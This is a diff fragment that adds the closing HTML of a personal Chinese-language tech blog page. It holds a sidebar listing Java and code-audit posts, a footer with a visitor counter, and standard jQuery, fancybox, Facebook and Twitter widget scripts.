+            <a href="/2020/08/02/Spring-5-learning-notes/">Spring5学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/18/An-audit-of-Java-Web-smbms/">记一次对JavaWeb-SMBMS的审计</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/18/Java-RMI-protocol-learning/">Java Rmi协议学习</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/13/Java-Dynamic-agent-mode/">Java动态代理模式</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+    不要因为走了太久而忘记当初为什么出发。
+    <br>
+    Copyrights &copy; 2022 shiyan All Rights Reserved. 
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_uv"> 
+    <a>「</a>本站访客数<span id="busuanzi_value_site_uv"></span>人次<a>」</a>
+    </span></div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/gossip" class="mobile-nav-link">Gossip</a>
+  
+    <a href="/yqlj" class="mobile-nav-link">Links</a>
+  
+</nav>
+
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/ja_JP/sdk.js#xfbml=1&version=v2.4";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+<script src="/js/script.js"></script>
+
+
+  </div>
+</body>
+</html>
